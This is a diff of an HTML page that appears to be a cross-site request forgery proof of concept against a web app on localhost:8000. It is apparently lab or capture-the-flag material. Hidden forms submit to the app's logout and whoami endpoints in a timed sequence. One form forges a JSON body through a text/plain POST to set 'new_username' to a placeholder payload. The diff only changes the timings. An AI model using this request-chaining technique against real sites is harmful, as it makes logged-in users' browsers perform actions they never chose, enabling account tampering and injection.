@@ -9,7 +9,7 @@
   <form id="f2" target="worker" action="http://localhost:8000/api/logout" method="GET"></form>
 
   <!-- Шаг 3: POST /api/whoami -->
-  <form id="f3" target="worker" action="http://localhost:8000/api/whoami" 
+  <form id="f3" target="worker" action="http://localhost:8000/api/whoami"
         method="POST" enctype="text/plain">
     <input name='{"new_username":"PAYLOAD' value='HERE"}'>
   </form>
@@ -18,13 +18,12 @@
   <form id="f4" target="worker" action="http://localhost:8000/#/settings" method="GET"></form>
 
   <script>
-    // Открываем вкладку один раз
     window.open('', 'worker');
 
-    setTimeout(() => { document.getElementById('f1').submit(); }, 2000);
-    setTimeout(() => { document.getElementById('f2').submit(); }, 4000);
-    setTimeout(() => { document.getElementById('f3').submit(); }, 6000);
-    setTimeout(() => { document.getElementById('f4').submit(); }, 8000);
+    setTimeout(() => { document.getElementById('f1').submit(); }, 3000);
+    setTimeout(() => { document.getElementById('f2').submit(); }, 6000);
+    setTimeout(() => { document.getElementById('f3').submit(); }, 9000);
+    setTimeout(() => { document.getElementById('f4').submit(); }, 12000);
   </script>
 
 </body>
